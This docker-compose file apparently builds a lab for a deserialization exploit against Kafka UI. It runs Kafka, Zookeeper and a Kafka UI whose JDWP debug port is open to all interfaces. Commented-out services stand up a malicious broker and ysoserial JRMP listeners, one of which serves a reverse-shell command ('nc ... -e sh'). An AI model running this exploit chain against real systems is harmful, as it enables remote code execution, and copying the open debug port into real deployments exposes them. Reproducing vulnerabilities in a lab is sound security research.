version: '3'
services:
  zookeeper:
    image: 'confluentinc/cp-zookeeper:7.6.1'
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181

  kafka:
    image: 'confluentinc/cp-kafka:7.6.1'
    depends_on:
      - zookeeper
    environment:
      KAFKA_ZOOKEEPER_CONNECT: 'zookeeper:2181'
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT

  kafka-ui:
    build: .
    depends_on:
      - kafka
    ports:
      - 8091:8080
      - 5005:5005
    environment:
      KAFKA_CLUSTERS_0_NAME: local
      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: 'kafka:9092'
      KAFKA_CLUSTERS_0_ZOOKEEPER: 'zookeeper:2181'
      DYNAMIC_CONFIG_ENABLED: 'true'
      JAVA_TOOL_OPTIONS: '-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005'

  # kafka-malicious-broker:
  #   image: 'confluentinc/cp-kafka:7.6.1'
  #   depends_on:
  #     - zookeeper
  #   ports:
  #     - 9093:9093
  #   environment:
  #     KAFKA_ZOOKEEPER_CONNECT: 'zookeeper:2181'
  #     KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://host.docker.internal:9093
  #     KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT
  #     KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT

  # ysoserial-stage1:
  #   build: https://github.com/artsploit/ysoserial.git#scala1
  #   ports:
  #     - 1718:1718
  #   entrypoint: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1718 Scala1 "org.apache.commons.collections.enableUnsafeSerialization:true"

  # ysoserial-stage2:
  #   build: https://github.com/artsploit/ysoserial.git#scala1
  #   ports:
  #     - 1719:1719
  #   entrypoint: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1719 CommonsCollections7 "nc host.docker.internal 1234 -e sh"